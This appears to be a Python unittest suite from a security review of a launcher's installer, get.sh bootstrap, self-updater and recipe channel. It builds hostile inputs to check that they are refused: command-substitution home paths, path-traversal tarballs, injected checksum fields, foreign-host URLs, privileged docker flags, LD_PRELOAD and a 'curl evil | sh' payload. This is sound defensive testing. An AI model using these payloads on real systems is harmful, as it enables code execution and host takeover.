"""Round 2 adversarial review: the install path, the update channel, the API.

Every case here was an attack that was actually attempted against the published
channel (xecores.com/downloads/get.sh, version.json, recipes.json, the 0.6.22
tarball) or against a hostile copy of it built locally. Nothing in this file
touches docker, the GPUs, or the network: hostile tarballs, hostile catalogs and
hostile ``version.json`` documents are built in a temp dir, and ``get.sh`` is
driven by a fake ``curl`` on PATH.

Severity notes live next to the assertion that catches the defect. Tests marked
DEFECT fail on 0.6.22 on purpose — they are the reproduction, and they turn
green with the fix sketched in /tmp/deepseek-r2-findings.md. Tests marked
DISPROVED pass today: the attack was tried, the code already refuses it, and the
assertion keeps it refused.

Run:  cd b70-launcher && python3 -m unittest tests.test_attack_round2 -v
"""
import copy
import hashlib
import io
import json
import os
import shlex
import shutil
import stat
import subprocess
import tarfile
import tempfile
import unittest
from pathlib import Path

try:
    import support_env
except ImportError:
    from tests import support_env

import b70launcher.catalog as catalog
import b70launcher.builders as builders
import b70launcher.downloads as downloads
import b70launcher.paths as paths
import b70launcher.scan as scan
import b70launcher.selfupdate as selfupdate

ROOT = Path(__file__).resolve().parent.parent
SYSTEM_PATH = "/usr/bin:/bin:/usr/sbin:/sbin"

# get.sh lives in the site repo (xecores.com/downloads/get.sh), not this one.
GET_SH = Path(os.environ.get("B70_GET_SH") or "/home/sergio/projects/xecores/public/downloads/get.sh")


def sha256_bytes(data):
    return hashlib.sha256(data).hexdigest()


def build_tarball(members, root_name="b70-launcher-9.9.9-linux-source"):
    """members: list of (name, kind, payload) where kind is
    'file' | 'dir' | 'symlink' | 'hardlink' | 'chardev'."""
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for name, kind, payload in members:
            info = tarfile.TarInfo(name)
            info.mode = 0o755
            if kind == "file":
                data = payload if isinstance(payload, bytes) else payload.encode()
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
            elif kind == "dir":
                info.type = tarfile.DIRTYPE
                tar.addfile(info)
            elif kind == "symlink":
                info.type = tarfile.SYMTYPE
                info.linkname = payload
                tar.addfile(info)
            elif kind == "hardlink":
                info.type = tarfile.LNKTYPE
                info.linkname = payload
                tar.addfile(info)
            elif kind == "chardev":
                info.type = tarfile.CHRTYPE
                tar.addfile(info)
    return buffer.getvalue()


GOOD_INSTALL_SCRIPT = "#!/bin/sh\nprintf 'installed %s\\n' \"$(date +%s)\" > \"${INSTALL_MARKER:?}\"\n"


class TempCase(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="b70-attack-"))
        self.addCleanup(shutil.rmtree, self.tmp, True)

    def write(self, name, data, mode=None):
        path = self.tmp / name
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(data, bytes):
            path.write_bytes(data)
        else:
            path.write_text(data)
        if mode:
            path.chmod(mode)
        return path


# ---------------------------------------------------------------------------
# 1. packaging/install.sh — the generated launchers and the wipe guard
# ---------------------------------------------------------------------------

class TestInstallerShellInjection(TempCase):
    """install.sh writes two shell wrappers and a .desktop file by
    interpolating $HOME and $XDG_DATA_HOME into heredocs and sed replacements.

    A path containing `"`, '`', `$(` or a newline therefore changes the meaning
    of the generated files. The attacker in this scenario controls the
    environment the installer runs in (a wrapper script, a .desktop launcher, a
    sudo -E invocation, or a home directory whose name contains a quote)."""

    def install(self, home, data_home=None, marker=None, path=SYSTEM_PATH):
        env = {"HOME": str(home), "PATH": path, "LANG": "C.UTF-8"}
        if data_home is not None:
            env["XDG_DATA_HOME"] = str(data_home)
        if marker is not None:
            env["INSTALL_MARKER"] = str(marker)
        env.pop("XDG_STATE_HOME", None)
        return subprocess.run(["sh", str(ROOT / "packaging" / "install.sh")],
                              cwd=str(ROOT), env=env, capture_output=True, text=True, timeout=300)

    def test_wrapper_quoting_with_hostile_home(self):
        """DEFECT (medium): the generated `b70`/`b70-launcher` wrapper runs the
        command substitution that was in $HOME when the installer wrote it."""
        canary = self.tmp / "canary-wrapper"
        home = self.tmp / "home$(touch canary-wrapper)"
        home.mkdir()
        result = self.install(home)
        self.assertEqual(result.returncode, 0, result.stderr[-800:])
        wrapper = home / ".local" / "bin" / "b70"
        self.assertTrue(wrapper.is_file())
        # The wrapper must be a script whose argv is exactly the intended path,
        # whatever characters the path contains.
        subprocess.run(["sh", str(wrapper), "--help"], capture_output=True, text=True,
                       timeout=60, cwd=str(self.tmp))
        self.assertFalse(canary.exists(),
                         f"a path in HOME executed as shell: {wrapper.read_text()}")

    def test_installer_refuses_control_characters_in_paths(self):
        """DEFECT (medium): a newline in HOME produces a half-written install and
        a wrapper whose quoted argument spans lines; there is no diagnostic."""
        home = self.tmp / "home\nIcon=evil"
        home.mkdir()
        result = self.install(home)
        self.assertNotEqual(result.returncode, 0, "a path with a newline must be refused up front")
        self.assertIn("HOME", (result.stdout + result.stderr))
        self.assertEqual(list((home / ".local" / "bin").glob("*")) if (home / ".local" / "bin").exists() else [], [])

    def test_desktop_entry_escaping_for_quotes_and_percent(self):
        """FIXED (low): a quote in the install path used to split Exec= into several shell words and
        a `%` became a desktop field code. A `%` is now written `%%` (desktop entry spec) in Exec
        and raw in TryExec; a path with a quote, backtick, dollar or backslash cannot be held by a
        menu entry, so none is written and the installer says so (the wrappers still work)."""
        for suffix in ('home" --field-code -c x"', "home$(id)", "home%U", "home%f"):
            with self.subTest(suffix=suffix):
                home = self.tmp / suffix
                home.mkdir()
                result = self.install(home)
                self.assertEqual(result.returncode, 0, result.stderr[-800:])
                target = home / ".local" / "bin" / "b70-launcher"
                self.assertTrue(target.is_file())
                desktop = home / ".local" / "share" / "applications" / "b70-launcher.desktop"
                if "%" not in suffix:
                    self.assertFalse(desktop.exists(), "a menu entry cannot represent this path")
                    self.assertIn("menu entry", result.stderr)
                    self.assertNotIn("menu entry works regardless", result.stderr)
                    self.assertIn("No menu entry was written", result.stderr)
                else:
                    self.assertIn("menu entry works regardless", result.stderr)
                    lines = desktop.read_text().splitlines()
                    exec_lines = [line for line in lines if line.startswith("Exec=")]
                    self.assertEqual(len(exec_lines), 1, desktop.read_text())
                    value = exec_lines[0][len("Exec="):]
                    words = shlex.split(value)
                    self.assertEqual(words, [str(target).replace("%", "%%")], exec_lines[0])
                    self.assertEqual([line[len("TryExec="):] for line in lines if line.startswith("TryExec=")],
                                     [str(target)])
                    self.assertNotRegex(exec_lines[0].replace("%%", ""), "%")
                shutil.rmtree(home, ignore_errors=True)

    def test_desktop_entry_handles_spaces(self):
        """DISPROVED: a space in the install path already works (quoted Exec,
        raw TryExec per the spec)."""
        home = self.tmp / "home with space"
        home.mkdir()
        result = self.install(home)
        self.assertEqual(result.returncode, 0, result.stderr[-800:])
        desktop = (home / ".local" / "share" / "applications" / "b70-launcher.desktop").read_text()
        target = home / ".local" / "bin" / "b70-launcher"
        self.assertIn(f'Exec="{target}"', desktop)
        self.assertIn(f"TryExec={target}", desktop)

    def test_symlinked_app_dir_is_replaced_not_followed(self):
        """DISPROVED: `rm -rf -- "$app"` on a symlink removes the link, so a
        pre-planted symlink cannot redirect the install into another directory."""
        home = self.tmp / "home"
        (home / ".local" / "share").mkdir(parents=True)
        victim = self.tmp / "victim"
        victim.mkdir()
        (victim / "keep.txt").write_text("do not delete\n")
        (home / ".local" / "share" / "b70-launcher").symlink_to(victim, target_is_directory=True)
        result = self.install(home)
        self.assertEqual(result.returncode, 0, result.stderr[-800:])
        self.assertEqual((victim / "keep.txt").read_text(), "do not delete\n")
        self.assertFalse((home / ".local" / "share" / "b70-launcher").is_symlink())

    def test_refuses_to_run_as_root(self):
        """DISPROVED: the root refusal fires before anything is written."""
        shim = self.tmp / "bin"
        shim.mkdir()
        fake_id = shim / "id"
        fake_id.write_text("#!/bin/sh\n[ \"$1\" = -u ] && { echo 0; exit 0; }\nexec /usr/bin/id \"$@\"\n")
        fake_id.chmod(0o755)
        home = self.tmp / "home"
        home.mkdir()
        result = self.install(home, path=f"{shim}:{SYSTEM_PATH}")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("rootless", result.stdout + result.stderr)
        self.assertFalse((home / ".local" / "share" / "b70-launcher").exists())

    def test_unexpected_app_path_is_kept(self):
        """DISPROVED: the wipe is guarded by a */b70-launcher suffix check."""
        source = (ROOT / "packaging" / "uninstall.sh").read_text()
        self.assertIn("*/b70-launcher)", source)
        self.assertIn("kept unexpected path", source)


# ---------------------------------------------------------------------------
# 2. get.sh — the bootstrap an operator pipes into sh
# ---------------------------------------------------------------------------

class GetShHarness(TempCase):
    """Runs the real get.sh with a fake `curl` on PATH, so the host-prefix and
    checksum logic of the published file is exercised without the network."""

    def setUp(self):
        super().setUp()
        if not GET_SH.is_file():
            self.skipTest(f"get.sh not found at {GET_SH}; set B70_GET_SH")
        self.bin = self.tmp / "bin"
        self.bin.mkdir()
        self.log = self.tmp / "curl.log"
        self.tarball = self.tmp / "payload.tar.gz"
        self.version = self.tmp / "version.json"
        shim = self.bin / "curl"
        shim.write_text(f"""#!/bin/sh
# fake curl: $1 = flags, $2 = url
printf '%s\\n' "$2" >> {self.log}
for last in "$@"; do :; done
case "$last" in
  *version.json) cat {self.version} ;;
  *) if [ -f {self.tarball} ]; then cat {self.tarball}; else exit 22; fi ;;
esac
""")
        shim.chmod(0o755)

    def write_version(self, url, digest):
        self.version.write_text(json.dumps({"version": "9.9.9", "tarball_url": url, "sha256": digest}))

    def run_get_sh(self, extra_env=None):
        env = {"HOME": str(self.tmp / "home"), "PATH": f"{self.bin}:{SYSTEM_PATH}", "LANG": "C.UTF-8"}
        env.update(extra_env or {})
        (self.tmp / "home").mkdir(exist_ok=True)
        return subprocess.run(["sh", str(GET_SH)], env=env, cwd=str(self.tmp),
                              capture_output=True, text=True, timeout=180)

    def fetched(self):
        return self.log.read_text() if self.log.exists() else ""

    def test_userinfo_url_is_refused_before_any_download(self):
        """DISPROVED: `https://xecores.com@evil/` fails the prefix test because
        the character after the host is '@', not '/'."""
        self.write_version("https://xecores.com@evil.invalid/x.tar.gz", "0" * 64)
        result = self.run_get_sh()
        self.assertNotEqual(result.returncode, 0)
        self.assertNotIn("x.tar.gz", self.fetched())

    def test_plain_http_and_file_urls_are_refused(self):
        """DISPROVED: only the https origin prefix is accepted; nothing is
        fetched for a foreign scheme or host."""
        for url in ("http://xecores.com/downloads/x.tar.gz",
                    "file:///etc/passwd",
                    "https://evil.invalid/downloads/x.tar.gz"):
            with self.subTest(url=url):
                self.log.unlink(missing_ok=True)
                self.write_version(url, "0" * 64)
                result = self.run_get_sh()
                self.assertNotEqual(result.returncode, 0)
                self.assertNotIn("x.tar.gz", self.fetched())

    def test_refusal_message_names_version_json(self):
        """DEFECT (low): when version.json is rejected the shell dies on
        `: "${URL:?}"` ("URL: parameter not set or null") instead of saying
        that version.json was rejected, so an operator cannot tell a broken
        channel from a hostile one."""
        self.write_version("https://evil.invalid/x.tar.gz", "0" * 64)
        result = self.run_get_sh()
        self.assertNotEqual(result.returncode, 0)
        message = result.stdout + result.stderr
        self.assertIn("version.json", message, message)

    def test_a_traversing_url_path_still_fails_the_checksum(self):
        """DISPROVED: `https://xecores.com/downloads/../../etc/passwd` passes
        the string prefix test, and then fails on the checksum like any other
        wrong file. It is not read as a local path."""
        payload = build_tarball([("b70-launcher-9.9.9-linux-source/packaging/install.sh", "file", GOOD_INSTALL_SCRIPT)])
        self.tarball.write_bytes(payload)
        self.write_version("https://xecores.com/downloads/../../etc/passwd", "0" * 64)
        result = self.run_get_sh()
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("SHA256 mismatch", result.stdout + result.stderr)

    def test_hostile_sha_field_cannot_inject_shell(self):
        """DISPROVED: shlex.quote in the version.json parser keeps a hostile
        sha256 field from being evaluated by the installer's eval."""
        canary = self.tmp / "canary-sha"
        payload = build_tarball([("b70-launcher-9.9.9-linux-source/packaging/install.sh", "file", GOOD_INSTALL_SCRIPT)])
        self.tarball.write_bytes(payload)
        hostile_sum = f'$(touch {canary})\n{sha256_bytes(payload)}  /tmp/x'
        self.write_version("https://xecores.com/downloads/x.tar.gz", hostile_sum)
        result = self.run_get_sh({"INSTALL_MARKER": str(self.tmp / "marker")})
        self.assertFalse(canary.exists(), "the sha256 field was evaluated as shell")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("SHA256 mismatch", result.stdout + result.stderr)

    def test_path_traversal_tarball_is_refused(self):
        """DISPROVED (GNU tar >= 1.29): absolute members are made relative,
        `..` members are skipped, and a symlink cannot be written through, so
        `tar -xzf` cannot escape the temp dir. get.sh still fails closed."""
        outside = self.tmp / "outside"
        outside.mkdir()
        payload = build_tarball([
            ("b70-launcher-9.9.9-linux-source/packaging/install.sh", "file", GOOD_INSTALL_SCRIPT),
            ("../escaped-dotdot.txt", "file", "dotdot\n"),
            (f"{outside}/escaped-absolute.txt", "file", "absolute\n"),
            ("b70-launcher-9.9.9-linux-source/link", "symlink", str(outside)),
            ("b70-launcher-9.9.9-linux-source/link/through-symlink.txt", "file", "through\n"),
            ("b70-launcher-9.9.9-linux-source/hard", "hardlink", "/etc/hostname"),
            ("b70-launcher-9.9.9-linux-source/dev", "chardev", None),
        ])
        self.tarball.write_bytes(payload)
        self.write_version("https://xecores.com/downloads/x.tar.gz", sha256_bytes(payload))
        marker = self.tmp / "marker"
        result = self.run_get_sh({"INSTALL_MARKER": str(marker)})
        self.assertFalse((self.tmp / "escaped-dotdot.txt").exists())
        self.assertEqual(sorted(p.name for p in outside.iterdir()), [])
        self.assertFalse(marker.exists(), "the installer ran out of a traversal archive")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("extract failed", result.stdout + result.stderr)

    def test_clean_archive_installs(self):
        """Control: the same harness with a well-formed archive reaches the
        installer, so the refusals above are the archive's fault, not the rig's."""
        payload = build_tarball([("b70-launcher-9.9.9-linux-source/packaging/install.sh", "file", GOOD_INSTALL_SCRIPT)])
        self.tarball.write_bytes(payload)
        self.write_version("https://xecores.com/downloads/x.tar.gz", sha256_bytes(payload))
        marker = self.tmp / "marker"
        result = self.run_get_sh({"INSTALL_MARKER": str(marker)})
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertTrue(marker.is_file())

    def test_get_sh_accepts_any_path_under_downloads(self):
        """DEFECT (low): the prefix test allows nested paths, and get.sh follows
        redirects, so the tarball may come from a different host than
        version.json's origin. selfupdate._plan is stricter than get.sh."""
        source = GET_SH.read_text()
        self.assertIn('startswith("https://xecores.com/downloads/")', source)
        self.assertNotIn("--max-redirs", source)
        self.assertNotIn('"/" in url', source)


# ---------------------------------------------------------------------------
# 3. selfupdate.py — the in-app update
# ---------------------------------------------------------------------------

class TestSelfUpdate(TempCase):
    def test_plan_refuses_a_tarball_outside_its_folder(self):
        """DISPROVED: the in-app updater is stricter than get.sh — same folder,
        single path segment, valid 64-hex digest."""
        doc = {"version": "99.0.0", "tarball_url": "https://xecores.com/downloads/../../evil/x.tgz", "sha256": "0" * 64}
        original_fetch = selfupdate._fetch
        selfupdate._fetch = lambda url, limit: json.dumps(doc).encode()
        try:
            with self.assertRaises(ValueError):
                selfupdate._plan()
        finally:
            selfupdate._fetch = original_fetch

    def test_plan_refuses_a_tarball_on_another_host(self):
        """DISPROVED: `version.json` cannot point the updater at a foreign host."""
        for url in ("https://evil.invalid/x.tgz", "http://xecores.com/downloads/x.tgz",
                    "https://xecores.com@evil.invalid/downloads/x.tgz", "https://xecores.com/downloads/sub/x.tgz"):
            with self.subTest(url=url):
                doc = {"version": "99.0.0", "tarball_url": url, "sha256": "0" * 64}
                original_fetch = selfupdate._fetch
                selfupdate._fetch = lambda u, limit: json.dumps(doc).encode()
                try:
                    with self.assertRaises(ValueError):
                        selfupdate._plan()
                finally:
                    selfupdate._fetch = original_fetch

    def test_install_refuses_a_traversal_archive_and_runs_no_installer(self):
        """DISPROVED: tarfile data_filter (or the explicit member scan on older
        Pythons) rejects `..`, absolute names, links out and device nodes, and
        the installer is never executed."""
        payload = build_tarball([
            ("b70-launcher-9.9.9-linux-source/packaging/install.sh", "file", "#!/bin/sh\ntouch /tmp/should-not-run\n"),
            ("../escaped.txt", "file", "dotdot\n"),
            ("b70-launcher-9.9.9-linux-source/dev", "chardev", None),
        ])
        digest = sha256_bytes(payload)
        canary = self.tmp / "installer-ran"

        def fake_fetch(url, limit):
            if url.endswith("version.json"):
                return json.dumps({"version": "99.0.0", "tarball_url": "https://xecores.com/downloads/x.tgz", "sha256": digest}).encode()
            return payload

        original_fetch, original_run = selfupdate._fetch, subprocess.run
        selfupdate._fetch = fake_fetch

        def guard(*args, **kwargs):  # the installer must never be called
            canary.write_text("ran")
            raise AssertionError("installer executed out of a hostile archive")

        subprocess.run = guard
        try:
            with self.assertRaises((ValueError, tarfile.TarError)):
                selfupdate._install("99.0.0", "https://xecores.com/downloads/x.tgz", digest)
        finally:
            selfupdate._fetch, subprocess.run = original_fetch, original_run
        self.assertFalse(canary.exists())

    def test_install_requires_the_installed_copy(self):
        """DISPROVED: a source checkout cannot start an update over itself."""
        with self.assertRaises(ValueError):
            selfupdate.start_install()


# ---------------------------------------------------------------------------
# 4. the recipe channel — catalog.py and the builders
# ---------------------------------------------------------------------------

class LauncherCatalogCase(support_env.LauncherStateCase, TempCase):
    """support_env.LauncherStateCase restores catalog state after each test;
    TempCase gives the test its own scratch directory."""

    def setUp(self):
        support_env.LauncherStateCase.setUp(self)
        TempCase.setUp(self)

    def tearDown(self):
        TempCase.tearDown(self)
        support_env.LauncherStateCase.tearDown(self)


HOSTILE_RECIPE_FIELDS = {
    # exec-shaping: must never arrive from the wire
    "image": "attacker/image:latest",
    "docker_sock": "/var/run/docker.sock",
    "fixed_flags": ["--privileged", "-v", "/:/host"],
    "env": {"LD_PRELOAD": "/tmp/evil.so"},
    "model_path": "/etc",
    "serve_config": "models/evil",
    "kind": "vllm",
    "llama_bin": "/tmp/evil",
    "strata_bin": "/tmp/evil",
}

HOSTILE_PAYLOAD_KEYS = {
    "download": {"kind": "file", "name": "../../../etc/shadow", "dest": "../../../etc"},
    "extra": "--privileged -v /:/host",
    "cmd": "sh -c 'curl evil | sh'",
    "volumes": ["/:/host"],
    "gpus": [0, 1, 2, 3],
}


class TestRecipeChannel(LauncherCatalogCase):

    def hostile_doc(self, model_id, engine, extra=None):
        recipe = dict(HOSTILE_PAYLOAD_KEYS)
        recipe.update(extra or {})
        return {"catalog_ver": "2099-01-01", "models": [{"id": model_id, "recipes": {engine: recipe}}]}

    def test_exec_shaping_fields_never_arrive_from_the_wire(self):
        """DISPROVED: REMOTE_RECIPE_FIELDS whitelists the wire, so an attacker
        who owns recipes.json cannot swap the image, the docker socket, the
        binary, the engine env or a host mount."""
        model = catalog.find_model("qwen36-27b-ar")
        engine = "vllm"
        before = copy.deepcopy(model["recipes"][engine])
        applied, needs_app, error = catalog.apply_recipe_doc(self.hostile_doc("qwen36-27b-ar", engine, HOSTILE_RECIPE_FIELDS), "2099-01-01")
        self.assertIsNone(error)
        after = catalog.find_model("qwen36-27b-ar")["recipes"][engine]
        for field in HOSTILE_RECIPE_FIELDS:
            self.assertEqual(after.get(field), before.get(field), f"{field} came from the wire")
        plan = builders.build({"model_id": "qwen36-27b-ar", "engine": engine, "ctx": 8192, "port": 8111, "dry_run": True})
        self.assertNotIn("error", plan)
        for token in plan["tokens"]:
            self.assertNotIn("attacker/image", token)
            self.assertNotIn("--privileged", token)
            self.assertNotIn("/tmp/evil", token)

    def test_hostile_download_spec_cannot_escape_the_models_dir(self):
        """DISPROVED: dest must be a single directory name and the repository
        must be on the approved list, so a hostile download block cannot write
        outside the models dir or fetch from an arbitrary repo."""
        recipe = {"download": {"repo": "attacker/models", "dest": "../../../etc", "kind": "file", "name": "../../etc/shadow"}}
        catalog.apply_recipe_doc({"catalog_ver": "2099-01-01", "models": [{"id": "qwen36-27b-ar", "recipes": {"vllm": recipe}}]}, "2099-01-01")
        model = catalog.find_model("qwen36-27b-ar")
        plan = downloads.plan_download(model, "vllm")
        self.assertIn("error", plan)
        self.assertTrue("approved" in plan["error"] or "single directory" in plan["error"], plan["error"])

    def test_unknown_model_and_engine_are_refused(self):
        """DISPROVED: a wire document cannot add a model or engine the app does
        not ship (it would arrive without its exec-shaping fields)."""
        applied, needs_app, error = catalog.apply_recipe_doc(
            {"catalog_ver": "2099-01-01", "models": [{"id": "attacker-model", "recipes": {"vllm": {"ctx": 4096}}}]}, "2099-01-01")
        self.assertEqual(applied, 0)
        self.assertEqual(needs_app, ["attacker-model:vllm"])
        self.assertIsNone(catalog.find_model("attacker-model"))

    def test_recipe_url_must_be_https_but_localhost_suffix_bypasses_the_check(self):
        """DEFECT (medium): `_url_ok` is a prefix test, so `http://127.0.0.1.attacker.tld/`
        and `http://localhost.attacker.tld/` are accepted as "local" and the
        recipe channel is fetched over plaintext HTTP from a foreign host."""
        for url in ("http://127.0.0.1.attacker.invalid/recipes.json",
                    "http://localhost.attacker.invalid/recipes.json",
                    "http://127.0.0.1.evil.example:8080/recipes.json"):
            with self.subTest(url=url):
                self.assertFalse(catalog._url_ok(url), f"{url} must not be treated as local")

    def test_remote_recipes_url_is_not_fetched_over_plain_http(self):
        """DEFECT (medium), end to end: with such a URL in the manifest,
        fetch_remote_recipes() attempts the fetch instead of refusing it."""
        catalog.RECIPE_REMOTE.update({"recipes_url": "http://127.0.0.1.attacker.invalid/recipes.json",
                                      "catalog_ver": "2099-01-01", "entries": {}})
        doc, err = catalog.fetch_remote_recipes()
        self.assertIsNone(doc)
        self.assertEqual(err, "remote recipes_url must be https")

    def test_manifest_entries_cannot_smuggle_fields(self):
        """DISPROVED: manifest entries are filtered to dicts and only read for
        version/note/recommended; nothing in them reaches a builder."""
        catalog.RECIPE_REMOTE.update({
            "checked": True, "recipes_url": "https://xecores.com/downloads/recipes.json",
            "catalog_ver": "2099-01-01",
            "entries": {"qwen36-27b-ar:vllm": {"ver": "2099-01-01", "note": "<img src=x>", "image": "evil"},
                        "notadict": "x"},
        })
        notice = catalog.recipe_notice_for("qwen36-27b-ar", "vllm")
        self.assertEqual(notice["remote_ver"], "2099-01-01")
        self.assertNotIn("image", notice)
        self.assertEqual(list(catalog.recipe_notices().keys()), ["qwen36-27b-ar:vllm"])

    def test_hostile_field_types_never_raise_out_of_build(self):
        """DEFECT (medium): a wrong-typed value for an allowed wire field makes
        build() raise TypeError/AttributeError, which the local API turns into a
        500 ("Launcher request failed: ...") instead of a rejection, and can put
        a non-string element into the docker argv."""
        bad_values = {"ctx": "abc", "ctx_max": "9", "power": "watts", "kv": {"a": 1},
                      "kv_options": "x", "offload_tensors": {"a": 1}, "tensor_split": {"a": 1},
                      "split_mode": ["x"], "spec_tokens": "x", "spec_p_min": "y", "tp": "z",
                      "inner_port": "nope", "gmu": "q", "gmu_safe": "r",
                      "gmu_safe_budget": "s", "search_name": {"a": 1}, "download": "notadict",
                      "recipe_ver": {"a": 1}}
        failures = []
        for model in list(catalog.RECIPES["models"]):
            for engine in list(model.get("recipes") or {}):
                if engine == "exl3":  # probes an isolated dockerd even for previews
                    continue
                for field, value in bad_values.items():
                    saved = copy.deepcopy(catalog.RECIPES)
                    try:
                        doc = {"catalog_ver": "2099-01-01", "models": [{"id": model["id"], "recipes": {engine: {field: value}}}]}
                        catalog.apply_recipe_doc(doc, "2099-01-01")
                        plan = builders.build({"model_id": model["id"], "engine": engine, "ctx": 8192,
                                               "port": 8123, "dry_run": True})
                        if "error" not in plan:
                            bad = [token for token in plan.get("tokens", []) if not isinstance(token, str)]
                            if bad:
                                failures.append(f"{model['id']}/{engine}.{field} put {bad!r} in argv")
                    except Exception as exc:  # noqa: BLE001 - the point of the test
                        failures.append(f"{model['id']}/{engine}.{field} raised {type(exc).__name__}: {exc}")
                    finally:
                        catalog.RECIPES.clear()
                        catalog.RECIPES.update(saved)
        self.assertEqual(failures, [], "hostile wire types must be rejected, not crash the build:\n" + "\n".join(failures))


# ---------------------------------------------------------------------------
# 5. published channel files — the bytes xecores.com actually serves
# ---------------------------------------------------------------------------

class TestPublishedChannel(TempCase):
    """Checks that read the published channel from a local download of it
    (``/tmp/attack`` by default). They document what 0.6.22 ships; they are
    skipped when the files are absent so the suite stays offline."""

    CHANNEL = Path(os.environ.get("B70_CHANNEL_DIR") or "/tmp/attack")

    def read_channel(self, name):
        path = self.CHANNEL / name
        if not path.is_file():
            self.skipTest(f"{path} missing; download the channel first")
        return path

    def test_tarball_matches_its_published_checksum(self):
        """DISPROVED: version.json, the .sha256 sidecar and the tarball agree."""
        tarball = self.read_channel("b70-launcher-0.6.22-linux-source.tar.gz").read_bytes()
        sidecar = self.read_channel("b70-launcher-0.6.22-linux-source.tar.gz.sha256").read_text().split()[0]
        version = json.loads(self.read_channel("version.json").read_text())
        self.assertEqual(sha256_bytes(tarball), sidecar)
        self.assertEqual(version["sha256"], sidecar)
        self.assertTrue(version["tarball_url"].startswith("https://xecores.com/downloads/"))

    def test_published_tarball_has_no_links_or_devices(self):
        """DISPROVED: the shipped archive contains only files and directories —
        no symlink, hardlink or device node for the installer to follow."""
        tarball = self.read_channel("b70-launcher-0.6.22-linux-source.tar.gz")
        with tarfile.open(tarball) as tar:
            for member in tar.getmembers():
                self.assertIn(member.type, (tarfile.REGTYPE, tarfile.AREGTYPE, tarfile.DIRTYPE), member.name)
                self.assertNotIn("..", Path(member.name).parts, member.name)
                self.assertFalse(member.name.startswith("/"), member.name)

    def test_published_recipes_json_cannot_change_exec_shaping_fields(self):
        """DISPROVED, end to end on the file xecores.com actually serves: the
        published catalog does carry `image`, `docker_sock`, `env`, `model_path`
        and `fixed_flags` (it is generated from the full local catalog), so the
        protection is the merge whitelist. Applying the served document must
        leave every exec-shaping field of every shipped recipe untouched."""
        doc = json.loads(self.read_channel("recipes.json").read_text())
        self.assertIn("catalog_ver", doc)
        watched = ("image", "docker_sock", "fixed_flags", "env", "model_path", "serve_config",
                   "kind", "llama_bin", "strata_bin", "strata_python", "expert_profile", "network")
        before = {}
        for model in catalog.RECIPES["models"]:
            for engine, recipe in (model.get("recipes") or {}).items():
                before[(model["id"], engine)] = {field: copy.deepcopy(recipe.get(field)) for field in watched}
        applied, needs_app, error = catalog.apply_recipe_doc(doc, doc.get("catalog_ver") or "")
        self.assertIsNone(error)
        for (model_id, engine), fields in before.items():
            recipe = catalog.find_model(model_id)["recipes"][engine]
            for field, value in fields.items():
                self.assertEqual(recipe.get(field), value, f"{model_id}/{engine}.{field} came from the wire")
        # And the served document is still usable as a data-only update.
        self.assertGreaterEqual(applied, 0)

    def test_published_get_sh_never_hardcodes_a_version_or_hash(self):
        """DISPROVED: get.sh resolves version.json at run time, so a replayed
        old get.sh cannot install a stale tarball silently."""
        source = self.read_channel("get.sh").read_text()
        self.assertNotRegex(source, r"b70-launcher-\d+\.\d+\.\d+-linux-source\.tar\.gz")
        self.assertNotRegex(source, r"\b[0-9a-f]{64}\b")


if __name__ == "__main__":
    unittest.main()
